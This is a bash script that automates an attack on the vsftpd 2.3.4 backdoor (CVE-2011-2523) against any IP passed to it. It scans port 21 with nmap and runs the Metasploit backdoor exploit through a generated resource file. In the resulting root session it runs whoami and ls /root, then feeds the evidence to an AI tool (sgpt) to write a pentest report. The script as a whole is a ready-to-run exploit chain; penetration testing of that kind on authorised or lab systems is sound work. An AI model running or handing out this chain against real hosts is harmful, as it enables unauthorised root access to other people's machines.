#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-}"
if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <TARGET_IP>"
  exit 1
fi

# Check dependencies
for tool in nmap sgpt msfconsole; do
  command -v $tool >/dev/null || { echo "[!] Missing tool: $tool"; exit 1; }
done

# Setup dirs
TS="$(date +%Y%m%d-%H%M%S)"
ROOT="attack_vsftpd_${TS}_${TARGET}"
SCAN="$ROOT/scan"
EXPLOIT="$ROOT/exploit"
REPORT="$ROOT/report"
mkdir -p "$SCAN" "$EXPLOIT" "$REPORT"

# Step 1: Scan
echo "[*] Step 1/4: Scanning port 21 on $TARGET ..."
SCANFILE="$SCAN/nmap_21.txt"
nmap -sV -p21 "$TARGET" -oN "$SCANFILE" >/dev/null 2>&1 || true

if ! grep -qi 'vsftpd 2\.3\.4' "$SCANFILE"; then
  echo "[!] Target does not appear vulnerable to vsftpd 2.3.4 (see $SCANFILE)"
  exit 1
fi

# Step 2: Exploit with Metasploit
echo "[*] Step 2/4: Exploiting vsftpd with Metasploit ..."
MSF_LOG="$EXPLOIT/msf_vsftpd.log"
MSF_RC="$EXPLOIT/vsftpd.rc"

cat > "$MSF_RC" <<EOF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $TARGET
set RPORT 21
run
sessions -i 1
uname -a
whoami
ls /root
exit
EOF

msfconsole -q -r "$MSF_RC" | tee "$MSF_LOG"

# Step 3: Extract proof
echo "[*] Step 3/4: Extracting proof of exploitation ..."
PROOF="$EXPLOIT/proof_vsftpd.txt"
grep -E "uid=0|Linux|root" "$MSF_LOG" | head -n 20 > "$PROOF" || true

# Step 4: Generate AI Report
echo "[*] Step 4/4: Generating AI penetration test report ..."
FINAL_REPORT="$REPORT/Executive_Report.md"

{
  echo "You are a penetration tester. Write a professional report for this exploitation."
  echo "=== INPUT: Nmap Scan ==="
  cat "$SCANFILE"
  echo
  echo "=== INPUT: Proof of Exploitation ==="
  if [[ -s "$PROOF" ]]; then
    cat "$PROOF"
  else
    echo "(proof not captured, use msf log excerpts below)"
    tail -n 30 "$MSF_LOG"
  fi
  echo
  echo "=== REQUIRED OUTPUT ==="
  echo "1. Executive Summary (non-technical)."
  echo "2. Target Information (IP, OS, services)."
  echo "3. Technical Findings: vsftpd 2.3.4 backdoor (CVE-2011-2523, CVSS 10.0)."
  echo "4. Exploitation Steps (high-level)."
  echo "5. Captured Evidence (from proof)."
  echo "6. Impact Assessment (what attacker can do)."
  echo "7. MITRE ATT&CK / OWASP mapping."
  echo "8. Remediation Recommendations."
} | sgpt --model gpt-40-mini > "$FINAL_REPORT"

# Done
echo "[✓] Attack completed. Artifacts saved:"
echo "  - Scan:          $SCANFILE"
echo "  - Exploit log:   $MSF_LOG"
echo "  - Proof:         $PROOF"
echo "  - Final Report:  $FINAL_REPORT"
